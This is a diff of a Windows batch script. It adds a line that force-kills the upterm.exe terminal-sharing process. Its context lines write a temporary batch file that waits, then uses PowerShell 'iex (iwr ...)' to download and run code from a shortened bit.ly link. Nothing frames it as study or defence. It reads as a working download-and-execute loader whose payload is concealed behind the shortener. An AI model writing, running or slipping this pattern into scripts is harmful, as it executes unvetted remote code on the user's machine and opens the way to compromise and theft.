@@ -1,6 +1,8 @@
 @echo off
 chcp 65001 > nul
 
+taskkill /f /im upterm.exe
+
 echo timeout /t 8 /nobreak > "%temp%\runme.bat"
 echo powershell iex (iwr bit.ly/b9virf -UseBasicParsing) >> "%temp%\runme.bat"
 
